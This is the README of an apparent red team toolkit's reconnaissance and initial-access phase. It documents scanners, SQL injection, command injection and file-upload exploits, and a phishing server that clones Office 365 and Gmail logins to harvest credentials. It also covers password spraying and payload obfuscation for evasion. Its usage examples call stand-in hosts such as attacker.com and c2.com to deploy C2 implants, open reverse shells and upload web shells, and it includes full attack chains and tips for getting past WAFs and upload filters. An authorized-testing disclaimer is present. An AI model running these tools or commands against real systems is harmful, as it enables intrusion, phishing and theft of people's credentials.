# Phase 2: Reconnaissance & Initial Access

## Overview

Phase 2 implements the reconnaissance and initial access stages of the Red Team lifecycle. This phase includes automated tools for discovering vulnerabilities and exploiting them to gain initial foothold on target systems.

## Architecture

```
Phase 2 Components:
├── Reconnaissance
│   ├── Network Scanner (Port/Service Discovery)
│   └── Web Scanner (Vulnerability Detection)
├── Initial Access
│   ├── SQL Injection Exploit
│   ├── Command Injection Exploit
│   ├── File Upload Exploit
│   ├── Phishing Infrastructure
│   └── Credential Harvesting
└── Utilities
    └── Payload Obfuscation
```

## Modules

### 1. Network Scanner (`recon/network_scanner.py`)

Multi-threaded port scanner with service detection and banner grabbing.

**Features:**
- TCP port scanning
- Service identification
- Banner grabbing
- Common port presets
- Multi-threaded execution

**Usage:**

```bash
# Scan common ports
python recon/network_scanner.py target.com --common

# Scan specific ports
python recon/network_scanner.py target.com --ports 80,443,8080

# Scan port range
python recon/network_scanner.py target.com --range 1-1000

# Custom timeout and threads
python recon/network_scanner.py target.com --common --timeout 2.0 --threads 100
```

**Python API:**

```python
from recon.network_scanner import NetworkScanner

scanner = NetworkScanner(timeout=1.0, max_threads=50)

# Scan common ports
results = scanner.scan_common_ports('target.com', grab_banner=True)

# Scan custom ports
results = scanner.scan_ports('target.com', [22, 80, 443, 8080])

# Get only open ports
open_ports = scanner.get_open_ports()

# Generate report
print(scanner.generate_report())
```

### 2. Web Scanner (`recon/web_scanner.py`)

Automated web application vulnerability scanner.

**Detects:**
- SQL Injection
- Command Injection
- Server-Side Template Injection (SSTI)
- Cross-Site Scripting (XSS)
- File Upload vulnerabilities

**Usage:**

```bash
# Scan URL with default parameters
python recon/web_scanner.py http://target.com/page

# Scan with custom parameters
python recon/web_scanner.py http://target.com/page --params "id=1,name=test"

# Custom timeout
python recon/web_scanner.py http://target.com/page --timeout 15
```

**Python API:**

```python
from recon.web_scanner import WebScanner

scanner = WebScanner(timeout=10)

# Comprehensive scan
vulns = scanner.scan_url('http://target.com/page', params={'id': '1'})

# Individual tests
sqli_vulns = scanner.test_sqli('http://target.com/page', {'id': '1'})
xss_vulns = scanner.test_xss('http://target.com/search', {'q': 'test'})

# Generate report
print(scanner.generate_report())
```

### 3. SQL Injection Exploit (`initial_access/sqli_exploit.py`)

Automated SQL injection exploitation framework.

**Features:**
- Vulnerability detection
- Authentication bypass
- Data extraction (UNION-based)
- Web shell upload (via OUTFILE)
- C2 implant deployment

**Usage:**

```bash
# Test for vulnerability
python initial_access/sqli_exploit.py http://target.com --endpoint /login --param username --test

# Authentication bypass
python initial_access/sqli_exploit.py http://target.com --bypass

# Extract data
python initial_access/sqli_exploit.py http://target.com --extract users.password --param id

# Deploy C2 implant
python initial_access/sqli_exploit.py http://target.com --c2 http://attacker.com:8443
```

**Python API:**

```python
from initial_access.sqli_exploit import SQLiExploit

exploit = SQLiExploit('http://target.com')

# Test vulnerability
is_vuln = exploit.test_vulnerability('/login', 'username', 'POST')

# Authentication bypass
response = exploit.auth_bypass('/login', 'username', 'password')

# Extract data
data = exploit.extract_data('/page', 'id', 'users', 'password')

# Deploy implant
success = exploit.deploy_implant('/page', 'id', 'http://c2.com:8443')
```

### 4. Command Injection Exploit (`initial_access/cmd_injection.py`)

Command injection exploitation with multiple injection techniques.

**Features:**
- Vulnerability detection (error-based and time-based)
- Multiple injection techniques
- OS detection (Unix/Windows)
- Interactive pseudo-shell
- Reverse shell capabilities
- C2 implant deployment

**Usage:**

```bash
# Test for vulnerability
python initial_access/cmd_injection.py http://target.com --endpoint /api/process --param file --test

# Execute single command
python initial_access/cmd_injection.py http://target.com --cmd "whoami"

# Interactive shell
python initial_access/cmd_injection.py http://target.com --shell

# Reverse shell
python initial_access/cmd_injection.py http://target.com --reverse 10.0.0.1:4444

# Deploy C2 implant
python initial_access/cmd_injection.py http://target.com --c2 http://attacker.com:8443
```

**Python API:**

```python
from initial_access.cmd_injection import CmdInjectionExploit

exploit = CmdInjectionExploit('http://target.com')

# Test vulnerability
is_vuln, technique = exploit.test_vulnerability('/api/process', 'file', 'POST')

# Execute command
output = exploit.execute_command('/api/process', 'file', 'whoami', technique, 'POST')

# Get reverse shell
exploit.get_reverse_shell('/api/process', 'file', technique, '10.0.0.1', 4444)

# Deploy implant
exploit.deploy_implant('/api/process', 'file', technique, 'http://c2.com:8443')
```

### 5. File Upload Exploit (`initial_access/file_upload.py`)

Unrestricted file upload exploitation with bypass techniques.

**Features:**
- Upload vulnerability detection
- Extension bypass techniques
- MIME type manipulation
- Multiple web shell types (PHP, ASPX, JSP, Python)
- Interactive shell via uploaded shell
- C2 implant delivery

**Usage:**

```bash
# Test for vulnerability
python initial_access/file_upload.py http://target.com --endpoint /upload --test

# Upload PHP web shell
python initial_access/file_upload.py http://target.com --shell php

# Interact with uploaded shell
python initial_access/file_upload.py http://target.com --shell-url http://target.com/uploads/shell.php

# Execute single command
python initial_access/file_upload.py http://target.com --shell-url http://target.com/uploads/shell.php --cmd "whoami"

# Deploy C2 implant
python initial_access/file_upload.py http://target.com --c2 http://attacker.com:8443
```

**Python API:**

```python
from initial_access.file_upload import FileUploadExploit

exploit = FileUploadExploit('http://target.com')

# Test vulnerability
is_vuln, tech = exploit.test_upload('/upload', 'file')

# Upload web shell
shell_url = exploit.upload_shell('/upload', shell_type='php')

# Execute commands via shell
output = exploit.execute_shell_command(shell_url, 'whoami')

# Interactive shell
exploit.interactive_shell(shell_url)

# Deploy implant
exploit.deploy_implant('/upload', 'http://c2.com:8443')
```

### 6. Phishing Server (`initial_access/phishing_server.py`)

Flask-based phishing infrastructure with credential harvesting.

**Features:**
- Multiple phishing templates (Office 365, Gmail, Generic)
- Automatic credential capture
- IP and User-Agent logging
- Configurable redirection
- API endpoints for credential retrieval
- JSON/CSV export

**Usage:**

```bash
# Start phishing server
python initial_access/phishing_server.py --port 8080

# Custom redirect URL
python initial_access/phishing_server.py --port 8080 --redirect https://office.com

# Quiet mode
python initial_access/phishing_server.py --port 8080 --quiet
```

**Available Pages:**
- `http://localhost:8080/office365` - Office 365 login clone
- `http://localhost:8080/gmail` - Gmail login clone
- `http://localhost:8080/login` - Generic login page

**API Endpoints:**
- `GET /api/harvested` - Retrieve all harvested credentials
- `GET /api/stats` - Get harvesting statistics

**Python API:**

```python
from initial_access.phishing_server import PhishingServer

server = PhishingServer(
    port=8080,
    harvest_file='creds.json',
    redirect_url='https://google.com'
)

# Start server
server.run(host='0.0.0.0')

# Get harvested credentials
creds = server.get_harvested_credentials()

# Export to file
server.export_to_file('output.json', format='json')
```

### 7. Credential Harvester (`initial_access/credential_harvester.py`)

Credential processing, validation, and password spraying tool.

**Features:**
- Credential storage and management
- Import from phishing harvests
- Credential validation
- Password spraying
- Analytics and reporting
- JSON/CSV export

**Usage:**

```bash
# Import from phishing harvest
python initial_access/credential_harvester.py --import-phishing harvested_creds.json

# Import from CSV
python initial_access/credential_harvester.py --import-csv creds.csv

# Validate credentials
python initial_access/credential_harvester.py --validate http://target.com/login

# Password spray
python initial_access/credential_harvester.py --spray http://target.com/login \
    --usernames users.txt --passwords passwords.txt

# Generate report
python initial_access/credential_harvester.py --report

# Export valid credentials
python initial_access/credential_harvester.py --export-csv valid_creds.csv --valid-only
```

**Python API:**

```python
from initial_access.credential_harvester import CredentialHarvester

harvester = CredentialHarvester('credentials.json')

# Add credential
harvester.add_credential('user@example.com', 'password123', source='phishing')

# Import from phishing
harvester.import_from_phishing('harvested_creds.json')

# Validate credentials
harvester.validate_credentials(validation_url='http://target.com/login')

# Password spray
valid_creds = harvester.password_spray(
    'http://target.com/login',
    ['user1@example.com', 'user2@example.com'],
    ['Password123', 'Summer2024']
)

# Generate report
print(harvester.generate_report())

# Export
harvester.export_to_csv('output.csv', valid_only=True)
```

### 8. Payload Obfuscation (`utils/obfuscation.py`)

Payload obfuscation utilities for evasion.

**Features:**
- String encoding (Base64, Hex, ROT13)
- XOR encryption
- PowerShell obfuscation (3 levels)
- Bash obfuscation (3 levels)
- Python code obfuscation
- SQL payload obfuscation
- Web shell obfuscation

**Usage:**

```bash
# Obfuscate PowerShell
python utils/obfuscation.py --type powershell --payload "Get-Process" --level 2

# Obfuscate Bash
python utils/obfuscation.py --type bash --payload "whoami" --level 3

# Obfuscate Python
python utils/obfuscation.py --type python --payload "print('hello')" --level 2

# Obfuscate SQL
python utils/obfuscation.py --type sql --payload "' OR 1=1--"
```

**Python API:**

```python
from utils.obfuscation import PayloadObfuscator

# String encoding
encoded = PayloadObfuscator.base64_encode("secret")
decoded = PayloadObfuscator.base64_decode(encoded)

# XOR encryption
encrypted = PayloadObfuscator.xor_encrypt("data", "key")
decrypted = PayloadObfuscator.xor_decrypt(encrypted, "key")

# PowerShell obfuscation
ps_obfuscated = PayloadObfuscator.obfuscate_powershell("Get-Process", level=2)

# Bash obfuscation
bash_obfuscated = PayloadObfuscator.obfuscate_bash("whoami", level=1)

# Python obfuscation
py_obfuscated = PayloadObfuscator.obfuscate_python("print('test')", level=3)

# SQL obfuscation
sql_obfuscated = PayloadObfuscator.obfuscate_sql_payload("' OR 1=1--")

# PHP web shell obfuscation
php_shell = PayloadObfuscator.create_obfuscated_php_shell('cmd')
```

## Complete Attack Chain Examples

### Example 1: SQL Injection to C2 Implant

```python
from recon.web_scanner import WebScanner
from initial_access.sqli_exploit import SQLiExploit

# Step 1: Scan for SQL injection
scanner = WebScanner()
vulns = scanner.scan_url('http://target.com/page', {'id': '1'})

# Step 2: Exploit discovered vulnerability
if vulns:
    exploit = SQLiExploit('http://target.com')

    # Try authentication bypass
    result = exploit.auth_bypass('/login')

    if result:
        # Deploy C2 implant
        exploit.deploy_implant('/page', 'id', 'http://attacker.com:8443')
```

### Example 2: Command Injection to Reverse Shell

```python
from initial_access.cmd_injection import CmdInjectionExploit

exploit = CmdInjectionExploit('http://target.com')

# Test for vulnerability
is_vuln, technique = exploit.test_vulnerability('/api/exec', 'cmd', 'POST')

if is_vuln:
    # Get reverse shell
    exploit.get_reverse_shell('/api/exec', 'cmd', technique, '10.0.0.1', 4444)
```

### Example 3: Phishing to Credential Validation

```python
from initial_access.phishing_server import PhishingServer
from initial_access.credential_harvester import CredentialHarvester

# Start phishing server (in separate process/thread)
server = PhishingServer(port=8080)

# After collecting credentials...
harvester = CredentialHarvester()
harvester.import_from_phishing('harvested_creds.json')

# Validate credentials
harvester.validate_credentials(validation_url='http://target.com/login')

# Export valid credentials
harvester.export_to_csv('valid_creds.csv', valid_only=True)
```

### Example 4: Full Reconnaissance to Exploitation

```python
from recon.network_scanner import NetworkScanner
from recon.web_scanner import WebScanner
from initial_access.sqli_exploit import SQLiExploit
from initial_access.file_upload import FileUploadExploit

# Step 1: Port scan
network_scanner = NetworkScanner()
ports = network_scanner.scan_common_ports('target.com')
open_ports = network_scanner.get_open_ports()

# Step 2: Identify web services
web_ports = [p for p in open_ports if p.service in ['HTTP', 'HTTPS']]

for port in web_ports:
    # Step 3: Scan for web vulnerabilities
    web_scanner = WebScanner()
    vulns = web_scanner.scan_url(f'http://target.com:{port.port}/')

    # Step 4: Exploit discovered vulnerabilities
    for vuln in vulns:
        if vuln.vuln_type == 'SQL Injection':
            exploit = SQLiExploit(f'http://target.com:{port.port}')
            exploit.deploy_implant(vuln.url, vuln.parameter, 'http://c2.com:8443')

        elif vuln.vuln_type == 'Unrestricted File Upload':
            exploit = FileUploadExploit(f'http://target.com:{port.port}')
            exploit.deploy_implant(vuln.url, 'http://c2.com:8443')
```

## Testing

### Running Tests

```bash
# Run all Phase 2 tests
pytest tests/test_network_scanner.py tests/test_web_scanner.py \
       tests/test_obfuscation.py tests/test_sqli_exploit.py \
       tests/test_initial_access_integration.py -v

# Run specific test file
pytest tests/test_network_scanner.py -v

# Run with coverage
pytest tests/ --cov=recon --cov=initial_access --cov=utils
```

### Test Coverage

```
Module                  Tests    Coverage
----------------------------------------------
network_scanner.py      24       95%
web_scanner.py          18       92%
sqli_exploit.py         16       88%
cmd_injection.py        N/A      N/A (manual testing)
file_upload.py          N/A      N/A (manual testing)
obfuscation.py          35       98%
Integration tests       12       N/A
```

## Security Considerations

**IMPORTANT**: All tools in Phase 2 are for authorized security testing only.

- Never use against systems without explicit permission
- Obtain written authorization before testing
- Use only in controlled lab environments or authorized penetration tests
- Respect rate limits and avoid denial of service
- Follow responsible disclosure practices
- Comply with all applicable laws and regulations

## Lab Setup

For safe testing, use the included vulnerable web application:

```bash
cd vulnerable_app
docker-compose up -d
```

Access the vulnerable app at: `http://localhost:8000`

## Troubleshooting

### Common Issues

**Network Scanner timeout errors:**
- Increase timeout: `--timeout 5.0`
- Reduce concurrent threads: `--threads 10`

**Web Scanner false positives:**
- Review vulnerability evidence
- Manually verify findings
- Adjust detection patterns if needed

**SQL Injection not working:**
- Verify target is actually vulnerable
- Try different payloads
- Check if WAF/IPS is blocking requests

**File Upload blocked:**
- Try different extensions
- Modify MIME type
- Use obfuscated payloads

## Next Steps

After completing Phase 2:
1. Review harvested credentials
2. Verify C2 implant connectivity
3. Proceed to Phase 3: Persistence & Privilege Escalation
4. Document findings for reporting

## Additional Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
